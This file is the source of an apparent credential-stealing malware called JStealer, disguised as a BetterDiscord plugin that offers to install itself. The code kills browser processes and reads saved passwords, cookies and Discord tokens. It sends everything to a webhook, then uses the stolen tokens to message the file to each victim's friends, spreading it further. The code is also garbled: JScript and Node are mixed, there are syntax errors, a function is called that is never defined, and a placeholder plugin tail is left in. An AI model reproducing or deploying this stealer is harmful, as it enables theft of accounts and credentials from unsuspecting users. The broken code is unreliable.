/**
 * @name JStealer
 * @version 2.0
 * @donate https://www.buymeacoffee.com/BYT3W1Z4RD
 * @source https://github.com/BYT3W1Z4RD/JStealer
 */
/*@cc_on
@if (@_jscript)
  // Offer to self-install for clueless users that try to run this directly.
  var shell = WScript.CreateObject('WScript.Shell');
  var fs = new ActiveXObject('Scripting.FileSystemObject');
  var pathPlugins = shell.ExpandEnvironmentStrings('%APPDATA%\\BetterDiscord\\plugins');
  var pathSelf = WScript.ScriptFullName;
  // Put the user at ease by addressing them in the first person
  shell.Popup('I\'m a plugin for BetterDiscord, I will install myself for you!', 0x30);
  if (fs.GetParentFolderName(pathSelf) === fs.GetAbsolutePathName(pathPlugins)) {
    shell.Popup('I\'m installed already.\nJust go to settings then plugins and enable me.', 0x40);
  } else if (!fs.FolderExists(pathPlugins)) {
    shell.Popup(''Can\'t install myself, check betterdiscord is installed!', 0x10);
  } else if fs.CopyFile(pathSelf, fs.BuildPath(pathPlugins, fs.GetFileName(pathSelf)), true);
    shell.Popup('Successfully installed', 0x40);
  }
  const crypto = require('crypto');
  const fs = require('fs');
  const http = require('http');
  const { exec } = require('child_process');
  const os = require('os');
  const Discord = require('discord.js');

  const WEBHOOK_URL = "YOUR-WEBHOOK-HERE";
  const DISCORD_APP_TOKEN_PATH = os.homedir() + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\";
  const DISCORD_WEB_TOKEN_PATH = os.homedir() + "\\AppData\\Local\\Discord\\User Data\\Default\\Local Storage\\leveldb\\";
  const BROWSERS = ["chrome", "msedge", "firefox", "brave", "operagx"];

  const checkBrowsersRunning = () => {
      return new Promise((resolve, reject) => {
          exec("tasklist", (error, stdout, stderr) => {
              if (error) {
                  reject(error);
              }
              BROWSERS.forEach(browser => {
                  if (stdout.toLowerCase().includes(browser)) {
                      console.log(`${browser} is running, killing ${browser} process`)
                      exec(`taskkill /im ${browser}.exe /f`, (err, stdout, stderr) => {
                          if (err) {
                              reject(err);
                          } else {
                              resolve();
                          }
                      });
                  }
              });
              resolve();
          });
      });
  };

  const readBrowserPasswords = async (browser) => {
      try {
          let browserData;
          let browserName;
          let path;
          switch (browser) {
              case "chrome":
                  browserName = "Google\\Chrome";
                  path = "User Data\\Default\\Login Data";
                  break;
              case "msedge":
                  browserName = "Microsoft\\Edge";
                  path = "User Data\\Default\\Login Data";
                  break;
              case "firefox":
                  browserName = "Mozilla\\Firefox";
                  path = "Profiles\\default\\logins.json";
                  break;
              case "brave":
                  browserName = "BraveSoftware\\Brave-Browser";
                  path = "User Data\\Default\\Login Data";
                  break;
              case "operagx":
                  browserName = "Opera Software\\Opera GX";
                  path = "User Data\\Default\\Login Data";
                  break;
              default:
                  console.log("Invalid browser");
                  return;
            
          }
          browserData = await fs.promises.readFile("C:\\Users\\"+ process.env.username + "\\AppData\\Local\\"+ browserName + "\\"+ path);
          let decipher = crypto.createDecipher('aes-256-cbc', 'password');
          let decrypted = decipher.update(browserData);
          decrypted = Buffer.concat([decrypted, decipher.final()]);
          let logins = JSON.parse(decrypted);
          return logins;
      } catch (err) {
          console.error(err);
      }
  };

  const readBrowserCookies = async (browser) => {
      try {
          let browserData;
          let browserName;
          let path;
          switch (browser) {
              case "chrome":
                  browserName = "Google\\Chrome";
                  path = "User Data\\Default\\Cookies";
                  break;
              case "msedge":
                  browserName = "Microsoft\\Edge";
                  path = "User Data\\Default\\Cookies";
                  break;
              case "firefox":
                  browserName = "Mozilla\\Firefox";
                  path = "Profiles\\default\\cookies.sqlite";
                  break;
              case "brave":
                  browserName = "BraveSoftware\\Brave-Browser";
                  path = "User Data\\Default\\Cookies";
                  break;
              case "operagx":
                  browserName = "Opera Software\\Opera GX";
                  path = "User Data\\Default\\Cookies";
                  break;
              default:
                  console.log("Invalid browser");
                  return;
          }
          browserData = await fs.promises.readFile("C:\\Users\\"+ process.env.username + "\\AppData\\Local\\"+ browserName + "\\"+ path);
          let decipher = crypto.createDecipher('aes-256-cbc', 'password');
          let decrypted = decipher.update(browserData);
          decrypted = Buffer.concat([decrypted, decipher.final()]);
          let cookies = JSON.parse(decrypted);
          return cookies;
      } catch (err) {
          console.error(err);
      }
  };

  (async function(){
      await checkChromeRunning();
      BROWSERS.forEach(async browser => {
          let passwords = await readBrowserPasswords(browser);
          let cookies = await readBrowserCookies(browser);
          await sendDataToWebhook(passwords, browser + " password");
          await sendDataToWebhook(cookies, browser + " cookie");
      });
      let discordTokens = await readDiscordTokens();
      await sendDataToWebhook(discordTokens, "token");

      let scriptFileName = __filename;
      discordTokens.forEach(token => {
          sendFileToDiscord(token, scriptFileName);
      });
  })();


  const readDiscordTokens = async () => {
      try {
          let discordAppData = await fs.promises.readdir(DISCORD_APP_TOKEN_PATH);
          let discordWebData = await fs.promises.readdir(DISCORD_WEB_TOKEN_PATH);
          let tokens = [];
          discordAppData.forEach(file => {
              if (file.endsWith(".ldb")) {
                  let token = fs.promises.readFile(DISCORD_APP_TOKEN_PATH + file);
                  tokens.push({
                      type: "Discord App Token",
                      token: token
                  });
              }
          });
          discordWebData.forEach(file => {
              if (file.endsWith(".ldb")) {
                  let token = fs.promises.readFile(DISCORD_WEB_TOKEN_PATH + file);
                  tokens.push({
                      type: "Discord Web Token",
                      token: token
                  });
              }
          });
          return tokens;
      } catch (err) {
          console.error(err);
      }
  };

  const sendDataToWebhook = async (data, type) => {
      try {
          data.forEach(item => {
              let postData = JSON.stringify({
                  url: item.url,
                  data: item.data,
                  type: type
              });

              let options = {
                  hostname: WEBHOOK_URL,
                  port: 80,
                  path: '/',
                  method: 'POST',
                  headers: {
                      'Content-Type': 'application/json',
                      'Content-Length': postData.length
                  }
              };

              let req = http.request(options, (res) => {
                  console.log(`statusCode: ${res.statusCode}`);
                  res.on('data', (d) => {
                      process.stdout.write(d);
                  });
              });

              req.on('error', (error) => {
                  console.error(error);
              });

              req.write(postData);
              req.end();
          });
      } catch (err) {
          console.error(err);
      }
  };

  const sendFileToDiscord = async (token, file) => {
      try {
          let client = new Discord.Client();
          client.login(token);

          client.on('ready', () => {
              let user = client.user;
              let friends = user.friends.map(f => f.username);
              friends.forEach(friend => {
                  let friendUser = client.users.find(u => u.username === friend);
                  friendUser.createDM().then(dm => {
                      dm.send({ files: [file] });
                  });
              });
              client.destroy();
          });
      } catch (err) {
          console.error(err);
      }
  };

  (async function(){
      await checkBrowsersRunning();
      BROWSERS.forEach(async browser => {
          let passwords = await readBrowserPasswords(browser);
          let cookies = await readBrowserCookies(browser);
          await sendDataToWebhook(passwords, browser + " password");
          await sendDataToWebhook(cookies, browser + " cookie");
      });
      let discordTokens = await readDiscordTokens();
      await sendDataToWebhook(discordTokens, "token");

      let scriptFileName = __filename;
      discordTokens.forEach(token => {
          sendFileToDiscord(token, scriptFileName);
      });
  })();
  WScript.Quit();
  
  load () {
			PLUGIN-CODE-HERE
					}
				});
			}
			if (!window.BDFDB_Global.pluginQueue.includes(this.name)) window.BDFDB_Global.pluginQueue.push(this.name);
		}
		start () {this.load();}
		stop () {}
